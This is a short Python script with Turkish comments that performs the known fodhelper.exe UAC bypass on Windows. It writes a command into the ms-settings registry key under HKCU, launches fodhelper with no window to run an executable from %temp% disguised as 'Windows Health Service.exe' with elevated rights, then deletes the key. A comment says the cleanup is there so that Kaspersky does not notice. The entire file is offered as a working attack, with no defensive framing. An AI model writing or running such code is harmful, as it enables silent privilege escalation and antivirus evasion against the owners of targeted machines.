import os
import winreg
import subprocess
import time

def bypass_uac_and_run(exe_path):
    # 1. Kayıt defteri yolu
    reg_path = r'Software\Classes\ms-settings\shell\open\command'

    # 2. EXE'nin tam yolunu hazırla (Örn: C:\Users\Ad\AppData\Local\Temp\asd\3.exe)
    # expandvars fonksiyonu %temp% gibi ifadeleri gerçek klasör yoluna çevirir.
    full_path = os.path.expandvars(exe_path)

    try:
        # Kayıt defteri anahtarını oluştur
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            # fodhelper çalıştığında bu dosyayı açacak
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, full_path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        print(f"[+] Kayıt defteri güncellendi. Hedef: {full_path}")

        # 3. Tetikleyiciyi çalıştır
        # CREATE_NO_WINDOW bayrağı ile pencere çıkmasını engelliyoruz
        subprocess.run("fodhelper.exe", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Sistemin komutu işlemesi için kısa bir süre tanı
        time.sleep(3)

        # 4. İzleri Temizle (Kaspersky'nin uyanmaması için önemli)
        # İşlem bittikten sonra kayıt defterini eski haline getiriyoruz
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
        print("[+] İzler temizlendi.")

    except Exception as e:
        print(f"[-] Hata: {e}")

if __name__ == "__main__":
    # Senin istediğin dosya yolu
    target_exe = r"%temp%\"Windows Health Service.exe"
    
    bypass_uac_and_run(target_exe)
